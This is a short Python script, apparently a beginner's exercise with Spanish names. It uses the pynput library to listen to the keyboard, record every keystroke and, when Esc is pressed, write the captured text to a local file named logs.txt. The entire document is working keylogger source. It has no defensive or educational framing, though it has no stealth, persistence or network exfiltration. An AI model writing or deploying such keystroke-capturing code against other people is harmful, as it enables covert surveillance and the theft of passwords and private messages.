#!/usr/bin/env python
#_*_ coding: utf-8 _*_

import pynput.keyboard

log_file = open('logs.txt','w+')

def keypress(key):
    if isinstance(key,pynput.keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def imprimir():
    teclas = ''.join(lista_teclas)
    new = teclas.split(' ')

    log_file.write(teclas)
    log_file.write('\n')

lista_teclas = []

def presiona(key):
    key1 = keypress(key)
    if key1 == "Key.space":
        lista_teclas.append(' ')
    elif key1 == "Key.enter":
        lista_teclas.append('\n')
    elif key1 == "Key.down":
        lista_teclas.append('\n')
    elif key1 == "Key.tab":
        pass
    elif key1 == "Key.backspace":
        pass
    elif key1 == "Key.esc":
        imprimir()
        return False
    else:
        lista_teclas.append(key1)

with pynput.keyboard.Listener(on_press=presiona) as listen:
    listen.join()